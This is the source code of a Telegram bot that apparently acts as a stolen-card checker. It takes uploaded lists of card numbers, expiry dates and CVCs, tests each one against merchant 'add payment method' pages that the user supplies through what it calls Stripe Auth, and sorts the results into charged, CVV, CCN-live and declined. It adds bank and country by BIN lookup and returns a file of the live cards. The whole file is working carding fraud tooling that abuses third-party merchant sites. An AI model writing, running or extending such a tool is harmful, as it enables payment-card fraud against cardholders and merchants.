import asyncio
import tempfile
import os
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
)

from config import TELEGRAM_BOT_TOKEN, MAX_WORKERS, DEFAULT_API_URL
from auth_processor import (
    generate_uuids, prepare_headers, check_card_across_sites, send_telegram_message
)

SITES_STORAGE_FILE = "sites.txt"

def save_site(url: str):
    with open(SITES_STORAGE_FILE, "a") as f:
        f.write(url.strip() + "\n")

def load_sites():
    try:
        with open(SITES_STORAGE_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return [DEFAULT_API_URL]

def bin_lookup(card_number: str):
    bin_number = card_number[:6]
    headers = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            scheme = str(data.get("scheme", "N/A")).upper()
            card_type = str(data.get("type", "N/A")).upper()
            level = str(data.get("brand", "STANDARD")).upper()
            bank = data.get("bank", {}).get("name", "Unknown Bank")
            country = data.get("country", {}).get("name", "Unknown Country")
            return f"{bin_number} - {level} - {card_type} - {scheme}", bank, country
        else:
            return f"{bin_number} - NOT FOUND", "Unknown Bank", "Unknown Country"
    except Exception:
        return f"{bin_number} - ERROR", "Unknown Bank", "Unknown Country"

def build_status_keyboard(card, total, processed, status, charged, cvv, ccn, low, declined):
    keyboard = [
        [InlineKeyboardButton(f"• {card} •", callback_data="noop")],
        [InlineKeyboardButton(f"• STATUS ➔ {status} •", callback_data="noop")],
        [InlineKeyboardButton(f"• CHARGED ➔ [ {charged} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• CVV ➔ [ {cvv} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• CCN ➔ [ {ccn} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• LOW FUNDS ➔ [ {low} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• DECLINED ➔ [ {declined} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• TOTAL ➔ [ {total} ] •", callback_data="noop")],
        [InlineKeyboardButton(" [ STOP ] ", callback_data="stop")],
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send me a .txt file with one card per line in the format:\n"
        "`card|month|year|cvc`\n"
        "Example:\n"
        "`4242424242424242|12|2025|123`",
        parse_mode="Markdown"
    )

async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Replace Site(s)", callback_data="replace_site")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("You want to replace the site(s)?", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "replace_site":
        await query.message.reply_text(
            "Please send the site information(s) in this format, or just send site URLs:\n"
            "SITE: https://example.com/my-account/add-payment-method/\n"
            "PAYMENT METHODS: [stripe]\n"
            "RESPONSE: Your Card Was Decline\n"
            "STATUS: The site can be used for API and in no-code checker.✅\n\n"
            "Or simply forward/paste direct URL(s) line by line."
        )
        context.user_data["awaiting_site"] = True

async def capture_site_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("awaiting_site", False):
        text = update.message.text.strip()
        # Extract all URLs
        urls = re.findall(r"https?://[^\s]+", text)
        if urls:
            # Overwrite sites file with new sites (replace!)
            with open(SITES_STORAGE_FILE, "w") as f:
                for url in urls:
                    f.write(url.strip() + "\n")
            context.user_data["awaiting_site"] = False
            await update.message.reply_text(f"Replaced sites list with {len(urls)} site(s).")
        else:
            await update.message.reply_text("No valid URLs found, please try again.")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "Usage: /chk <card_number> <month|year> <cvc>\nExample: /chk 4242424242424242 12|25 123"
        )
        return
    card_number = args[0]
    exp = args[1]
    cvc = args[2]
    if '|' not in exp:
        await update.message.reply_text("Expiry must be in MM|YY or MM|YYYY format.")
        return
    card_data = f"{card_number}|{exp}|{cvc}"
    sites = load_sites()
    headers = prepare_headers()
    uuids = generate_uuids()
    chat_id = update.message.chat_id
    bot_token = TELEGRAM_BOT_TOKEN
    loop = asyncio.get_running_loop()
    status, msg, raw = await loop.run_in_executor(
        None,
        check_card_across_sites,
        card_data,
        headers,
        uuids,
        chat_id,
        bot_token,
        sites
    )
    await update.message.reply_text(f"Result: {status}\nMessage: {msg}")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please upload a .txt file with card data.")
        return
    file = await doc.get_file()
    local_path = os.path.join(tempfile.gettempdir(), doc.file_name)
    await file.download_to_drive(local_path)
    with open(local_path, "r") as f:
        lines = [line.strip() for line in f if line.strip() and len(line.split("|")) == 4]
    total = len(lines)
    if total == 0:
        await update.message.reply_text("❌ The file is empty or invalid format.")
        return
    preparing_msg = await update.message.reply_text("Preparing file ⚙️...")
    await asyncio.sleep(2)
    await preparing_msg.delete()
    charged_count = cvv_count = ccn_count = low_funds_count = declined_count = 0
    collected_cards = []
    reply_msg = await update.message.reply_text(
        f"Processing 0/{total}...",
        reply_markup=build_status_keyboard(
            "Waiting for first card", total, 0, "Idle",
            charged_count, cvv_count, ccn_count, low_funds_count, declined_count
        )
    )
    uuids = generate_uuids()
    headers = prepare_headers()
    chat_id = update.message.chat_id
    bot_token = TELEGRAM_BOT_TOKEN
    loop = asyncio.get_running_loop()

    # Add stop flag to context.bot_data
    context.bot_data["stop"] = False

    async def process_cards():
        nonlocal charged_count, cvv_count, ccn_count, low_funds_count, declined_count, collected_cards, reply_msg
        for idx, card in enumerate(lines):
            if context.bot_data.get("stop"):
                await update.message.reply_text(f"Stopped processing at card {idx+1}.")
                break
            status_category, telegram_message, raw_card = await loop.run_in_executor(
                None,
                check_card_across_sites,
                card,
                headers,
                uuids,
                chat_id,
                bot_token,
                load_sites()
            )
            if status_category == "CHARGED":
                charged_count += 1
                status_text = "Charged"
            elif status_category == "CVV":
                cvv_count += 1
                status_text = "CVV Incorrect"
                collected_cards.append(f"{raw_card} | CVV")
            elif status_category == "CCN":
                ccn_count += 1
                status_text = "CCN Live"
                collected_cards.append(f"{raw_card} | CCN")
            elif status_category == "LOW_FUNDS":
                low_funds_count += 1
                status_text = "Insufficient Funds"
            else:
                declined_count += 1
                status_text = "Declined"

            try:
                bin_info, bank, country = bin_lookup(raw_card.split('|')[0])
            except Exception:
                bin_info, bank, country = "N/A", "N/A", "N/A"

            msg = (
                f"CARD: {raw_card}\n"
                f"Gateway: Stripe Auth\n"
                f"Response: {status_text} {'✅' if status_category in ['CHARGED', 'CVV', 'LOW_FUNDS'] else '❌'}\n\n"
                f"Bin Info: {bin_info}\n"
                f"Bank: {bank}\n"
                f"Country: {country}"
            )
            await update.message.reply_text(msg, parse_mode="HTML")

            try:
                await reply_msg.edit_text(
                    f"Processing {idx+1}/{total}...",
                    reply_markup=build_status_keyboard(
                        raw_card, total, idx+1, status_text,
                        charged_count, cvv_count, ccn_count, low_funds_count, declined_count
                    )
                )
            except Exception:
                pass

        await update.message.reply_text("✅ Finished processing all cards.")

        if collected_cards:
            result_file = os.path.join(tempfile.gettempdir(), "results.txt")
            with open(result_file, "w") as f:
                f.write("\n".join(collected_cards))
            await update.message.reply_document(
                InputFile(result_file, filename="results.txt"),
                caption="📂 Collected CVV + CCN cards"
            )

    # Run the card processing async task
    asyncio.create_task(process_cards())

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop button callback"""
    context.bot_data["stop"] = True
    await update.message.reply_text("Stopping after current card...")

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("site", site))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("stop", stop))  # optional text command to stop
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), capture_site_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
